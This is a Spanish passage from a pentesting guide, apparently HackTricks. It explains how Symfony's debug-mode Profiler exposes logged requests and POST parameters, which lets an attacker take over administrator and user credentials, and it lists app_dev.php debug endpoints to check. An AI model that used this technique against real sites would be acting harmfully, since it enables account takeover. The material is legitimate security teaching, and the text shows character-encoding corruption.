El propio framework Symfony es muy seguro, pero habilitar el modo de depuraci√≥n har√° que este framework sea extremadamente vulnerable. Por ejemplo, Profiler tiene una funci√≥n llamada Profile Search, como se muestra en la siguiente captura de pantalla.

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

Como se puede ver en la captura de pantalla anterior, se pueden acceder a todas las solicitudes enviadas al servidor. Al hacer clic en los hashes del token, se pueden leer todos los par√°metros POST, como se ve en la siguiente captura de pantalla. Con esta funci√≥n, podemos secuestrar las credenciales de la cuenta del administrador y del usuario.

![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### Otros puntos finales habilitados para la depuraci√≥n

Tambi√©n debe comprobar estas URL:

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## Referencias

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Consigue el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
